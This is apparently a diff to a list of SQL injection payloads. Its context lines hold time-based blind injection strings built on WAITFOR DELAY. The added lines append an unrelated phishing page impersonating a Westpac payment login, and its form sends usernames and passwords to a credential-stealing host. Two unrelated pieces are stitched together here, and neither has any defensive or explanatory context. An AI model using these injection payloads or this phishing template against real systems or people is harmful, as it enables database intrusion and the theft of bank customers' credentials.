@@ -34,3 +34,25 @@ DESC%2C(SELECT * FROM (SELECT WAITFOR DELAY '00:00:05'))a
 (SELECT 0 FROM (SELECT WAITFOR DELAY '00:00:05'))/*+ 
 (SELECT 0 FROM (SELECT WAITFOR DELAY '00:00:05'))*/ 
 '',)+/test/%26%26%09WAITFOR DELAY '00:00:05'%09-- 
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Westpac Payment Login</title>
+</head>
+<body>
+    <h1>Login to Westpac Payment</h1>
+    <form action="https://phishing-site.com/steal-credentials" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username"><br><br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password"><br><br>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
+
